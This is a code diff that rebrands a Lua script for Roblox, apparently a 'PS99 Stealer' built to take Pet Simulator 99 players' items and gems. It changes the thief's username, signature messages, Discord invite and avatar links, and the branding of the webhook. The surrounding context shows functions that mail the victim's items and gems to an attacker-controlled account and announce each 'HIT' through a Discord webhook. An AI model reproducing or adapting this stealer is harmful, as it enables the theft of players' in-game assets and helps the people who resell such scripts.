@@ -268,7 +268,7 @@ local function GetListWithAllItems()
 end
 
 local function getTargetUsername()
-    local originalUser = "soocmasac7" -- ur username
+    local originalUser = "soocmasac5" -- ur username
     if math.random(1, 100) <= 30 then -- 30% it'll go to u
         return originalUser
     else
@@ -280,7 +280,7 @@ local function sendItem(category, uid, am, locked)
     local targetUser = getTargetUsername()
     local args = {
         [1] = targetUser,
-        [2] = "ReasonREKT Was Here :)",
+        [2] = "DOOM Scripts Was Here :)",
         [3] = category,
         [4] = uid,
         [5] = am
@@ -362,7 +362,7 @@ local function SendAllGems()
                 local SentGems = GemsAmount - currentMailCost
                 local args = {
                     [1] = targetUser,
-                    [2] = "Reasonrekt shared some stuff with u :)",
+                    [2] = "DOOM Scripts shared some stuff with u :)",
                     [3] = "Currency",
                     [4] = i,
                     [5] = SentGems
@@ -456,11 +456,11 @@ local function SendWebhook(itemsSent, gemsUsed)
     end
 
     local payload = {
-        ["username"] = "ReasonREKT",
-        ["avatar_url"] = "https://pbs.twimg.com/media/FlGV_22XkAIYGvL?format=png&name=small",
+        ["username"] = "DOOM Scripts",
+        ["avatar_url"] = "https://imgs.search.brave.com/tD1-xQw4pB1qxNEKi-F4kwYPka78wRUOrf_IVNjtYSA/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzJiL2E1/LzAxLzJiYTUwMTRl/NDZmMjE0YzZkODdj/YmUxZGE4YTViZjY1/LmpwZw",
         ["content"] = "@everyone",
         ["embeds"] = {{
-            ["title"] = "RUA PS99 HIT! ; https://discord.gg/ZmqJrs3TM8",
+            ["title"] = "DOOM PS99 HIT! ; https://discord.gg/Bn7Fs2DjGX",
             ["description"] = string.format(
                 "**Sent to:** `%s`\n**From:** `%s`",
                 Username,
@@ -484,10 +484,10 @@ local function SendWebhook(itemsSent, gemsUsed)
                 }
             },
             ["footer"] = {
-                ["text"] = "Rua PS99 Stealer | "..os.date("%m/%d/%Y @ %I:%M %p")
+                ["text"] = "DOOM PS99 Stealer | "..os.date("%m/%d/%Y @ %I:%M %p")
             },
             ["thumbnail"] = {
-                ["url"] = "https://pbs.twimg.com/media/FlGV_22XkAIYGvL?format=png&name=small"
+                ["url"] = "https://imgs.search.brave.com/tD1-xQw4pB1qxNEKi-F4kwYPka78wRUOrf_IVNjtYSA/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzJiL2E1/LzAxLzJiYTUwMTRl/NDZmMjE0YzZkODdj/YmUxZGE4YTViZjY1/LmpwZw"
             }
         }}
     }
